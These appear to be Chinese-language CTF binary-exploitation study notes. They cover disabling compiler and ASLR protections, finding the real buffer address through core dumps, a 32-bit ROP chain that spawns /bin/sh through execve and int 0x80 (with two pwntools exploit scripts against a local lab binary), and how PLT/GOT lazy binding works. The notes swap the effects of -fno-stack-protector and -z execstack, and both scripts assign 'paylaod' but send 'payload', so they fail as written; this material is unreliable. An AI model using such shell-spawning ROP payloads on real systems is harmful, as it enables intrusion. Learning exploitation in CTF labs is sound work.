## PWN-Tips-1

## 题目源码编译

如果希望什么保护都没有的编译命令一般是：

```shell
gcc -m32 -fno-stack-protector -z execstack -o level1 level1.c
```

- `-m32`的意思是编译为32位的程序，64位操作系统有时候需要安装兼容包
- `-fno-stack-protector`会关闭DEP
- `-z execstack`会关闭Stack Protector

在root权限下执行，或者sudo执行：

```shell
echo 0 > /proc/sys/kernel/randomize_va_space
```

这样就关闭掉了整个系统的ASLR

## gdb调试内存

gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行程序的时候，buf的位置会固定在别的地址上，这里采用的方法是开启：core dump

在root权限下执行，或者sudo执行：

```shell
ulimit -c unlimited
```

开启之后，当出现内存错的时候，系统会生成一个core dump文件在当前目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了，使用gdb调试转储：

```shell
gdb name core
```

## 系统调用

Linux的系统调用通过`int 80h`实现，用系统调用号来区分入口函数。应用程序调用系统调用的过程是：

- 把系统调用的编号存入EAX
- 把函数参数存入其它通用寄存器
- 触发0x80号中断（int 0x80）

那么我们如果希望通过系统调用来获取shell就需要把系统调用的参数放入各个寄存器，然后执行int 0x80就可以了

如果说想通过系统调用执行的是：`execve("/bin/sh",NULL,NULL)`（32位程序）

那么eax寄存器应该存放系统调用号，查看execve的系统调用号：

```shell
cat /usr/include/asm/unistd_32.h | grep execve
```

可以得到为11，转换为16进制就为0xb，所以eax中应该存放0xb

ebx应该存放想要执行的"/bin/sh"的地址，还有两个参数设置为0

所以现在需要做的就是让：

- eax=0xb
- ebx="/bin/sh"的地址
- ecx=0
- edx=0

只需要让栈顶的值是0xb然后可以通过pop eax达到目的，要用ROPgadget来查找，使用命令找到pop eax：

```shell
ROPgadget	--binary rop --only 'pop|ret' | grep 'eax'
```

类似的，通过这条命令寻找控制其它寄存器的地址，找到可以控制多个的。同时使用找到字符串在什么地方

```shell
ROPgadget	--binary rop --string '/bin/sh'
```

以及还有需要的int 0x80

```shell
ROPgadget	--binary rop --only 'int'
```

类似的exp：

```python
#!/usr/bin/env python
from pwn import *
p=process('./rop')
int_addr=0x8049421
bin_addr=0x80be408
pop_other_ret=0x806eb90
pop_eax_ret=0x80bb196
paylaod='a'*112+p32(pop_eax_ret)+p32(0xb)+p32(pop_other_ret)+p32(0)+p32(0)+p32(bin_addr)+p32(int_addr)
p.sendline(payload)
p.interactive()
```

或者

```python
#!/usr/bin/env python
from pwn import *
p=process('./rop')
pop_eax_ret=0x80bb196
pop_other_ret=0x806eb90
int_addr=0x8049421
bin_addr=0x80be408
paylaod=flat(['a'*112,pop_eax_ret,0xb,pop_other_ret,0,0,bin_addr,int_addr])
#flat模块能将patten字符串和地址结合并且转换为字节模式
p.sendline(payload)
p.interactive()
```

栈的布局就是：

|     Low Address     |
| :-----------------: |
|       "A"*112       |
|     pop_eax_ret     |
|         0xb         |
| pop_edx_ecx_ebx_ret |
|          0          |
|          0          |
|       /bin/sh       |
|      int 0x80       |
|  **High Address**   |

## 动态链接

### PLT&GOT

以printf函数为例，运行时进行重定位是无法修改代码段的，只能将printf重定位到数据段，但是已经编译好的程序，调用printf的时候怎么才能找到这个地址呢。链接器会额外生成一小段代码，通过这段代码来获取printf()的地址，就像下面那样，进行链接的时候只需要对printf_stub()经行重定位操作就可以

```assembly
.text
...

;调用printf的call指令
call printf_stub
...
printf_stub:
	mov rax,[printf函数的存储地址]	;获取printf重定位之后的地址
	jmp rax;跳过去执行printf函数
	
.data
...
printf函数的存储地址，这里存储printf重定位后的地址
```

总体来说，动态链接每个函数需要两个东西：

- 用来存放外部函数地址的数据段
- 用来获取数据段记录的外部函数地址的代码

对应有两个表，一个用来存放外部的函数地址的数据表称为**全局偏移表**（GOT，Global Offset Table），那个存放额外代码的表成为程序链接表（PLT，Procedure Link Table）

![](https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/QQ%E5%9B%BE%E7%89%8720200214210409.png)

可执行文件里面保存的是PLT表的地址，对应PTL地址指向的是GOT的地址，GOT表指向的就是glibc中的地址。那我们可以发现，在这里面想要通过PLT表获取函数的地址，首先要保证GOT表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，Linux引入了延迟绑定机制

### 延迟绑定

只有在动态库函数在被调用时，才会地址解析和重定位工作，为此可以用类似这样的代码来实现：

```c
//一开始没有重定位的时候将printf@got填成lookup_printf的地址
void printf@got()
{
    address_good:
    	jmp *printf@got
    lookup_printf:
    	//调用重定位函数查找printf地址，并写到printf@got
    	goto address_good;//再返回去执行address_good
}
```

说明一下这段代码工作流程，一开始`printf@got`是`lookup_printf`函数的地址，这个函数用来寻找`printf()`的地址，然后写入`printf@got`，`lookup_printf`执行完成后会返回到`address_good`，这样再jmp的话就可以直接跳到`printf`来执行了

也就是说，如果不知道printf的地址，就去找一下，知道的话就直接去jmp执行printf了

接下来，我们就来看一下这个"找"的工作是怎么实现的：

```
Disassembly of section .plt:

080482d0 <common@plt>:
 80482d0:	ff 35 04 a0 04 08    	pushl  0x804a004
 80482d6:	ff 25 08 a0 04 08    	jmp    *0x804a008
 80482dc:	00 00                	add    %al,(%eax)
	...

080482e0 <puts@plt>:
 80482e0:	ff 25 0c a0 04 08    	jmp    *0x804a00c
 80482e6:	68 00 00 00 00       	push   $0x0
 80482eb:	e9 e0 ff ff ff       	jmp    80482d0 <_init+0x28>

080482f0 <__libc_start_main@plt>:
 80482f0:	ff 25 10 a0 04 08    	jmp    *0x804a010
 80482f6:	68 08 00 00 00       	push   $0x8
 80482fb:	e9 d0 ff ff ff       	jmp    80482d0 <_init+0x28>
```

ps.这里 plt 表的第一项使用 objdump 的时候给没有符号名的一项自动改成了离他最近的一项，为了避免引起误会，改成了 common，而且随着不断深入，会发现，确实可以叫 common

其中除第一个表项以外，plt 表的第一条都是跳转到对应的 got 表项，而 got 表项的内容我们可以通过 gdb 来看一下，如果函数还没有执行的时候，这里的地址是对应 plt 表项的下一条命令，即 push 0x0

还记得之前我们说的，在还没有执行过函数之前`printf@got`的内容是`lookup_printf`函数的地址，这就是要去找`printf`函数的地址了

现在要做的是：

```assembly
push   $0x0    ;将数据压到栈上，作为将要执行的函数的参数
jmp    0x80482d0   ;去到了第一个表项
```

接下来继续

```assembly
080482d0 <common@plt>:
pushl  0x804a004  ;将数据压到栈上，作为后面函数的参数
jmp    *0x804a008 ;跳转到函数
add    %al,(%eax)
    ...
```

我们同样可以使用 gdb 来看一下这里面到底是什么，可以看到，在没有执行之前是全 0

![image.png](https://cdn.nlark.com/yuque/0/2020/png/268938/1580780401627-53526fc2-3646-4478-b040-8f1fb30ca0dc.png)

当执行后他有了值

![image.png](https://cdn.nlark.com/yuque/0/2020/png/268938/1580780428606-42b2c58b-1809-43dc-8b4e-afa79a1456cf.png)

这个值对应的函数是 `_dl_runtime_resolve`

那现在做一个小总结：

在想要调用的函数没有被调用过，想要调用他的时候，是按照这个过程来调用的

```
xxx@plt -> xxx@got -> xxx@plt -> 公共@plt -> _dl_runtime_resolve
```

到这里我们还需要知道

1. `_dl_runtime_resolve` 是怎么知道要查找 printf 函数的
2. `_dl_runtime_resolve` 找到 printf 函数地址之后，它怎么知道回填到哪个 GOT 表项

第一个问题，在 xxx@plt 中，我们在 jmp 之前 push 了一个参数，每个 xxx@plt 的 push 的操作数都不一样，那个参数就相当于函数的**id**，告诉了` _dl_runtime_resolve `要去找哪一个函数的地址

在 elf 文件中 .rel.plt 保存了重定位表的信息，使用 `readelf -r test` 命令可以查看 test 可执行文件中的重定位信息

![image.png](https://cdn.nlark.com/yuque/0/2020/png/268938/1580780626820-92e99da4-b8f0-43c7-b9df-1ba09342a0ff.png)

这里有些问题，对应着大佬博客说 plt 中 push 的操作数，就是对应函数在.rel.plt 段的偏移量，但是没对比出来

第二个问题，看 .rel.plt 的位置就对应着 xxx@plt 里 jmp 的地址

> 在 i386 架构下，除了每个函数占用一个 GOT 表项外，GOT 表项还保留了３个公共表项，也即 got 的前３项，分别保存：
>
> **got [0]: 本 ELF 动态段 (.dynamic 段）的装载地址** 
>
> **got [1]：本 ELF 的 link_map 数据结构描述符地址** 
>
> **got [2]：_dl_runtime_resolve 函数的地址**
>
> 动态链接器在加载完 ELF 之后，都会将这３地址写到 GOT 表的前３项

**跟着大佬的流程图来走一遍：**

第一次调用

![img](https://cdn.nlark.com/yuque/0/2020/jpeg/268938/1580739542097-a6d2738b-9a08-4b5f-acd8-d5f2c4d77278.jpeg)

之后再次调用![img](https://cdn.nlark.com/yuque/0/2020/jpeg/268938/1580739570228-64997692-8003-4c10-acf2-2c8d91095e3c.jpeg)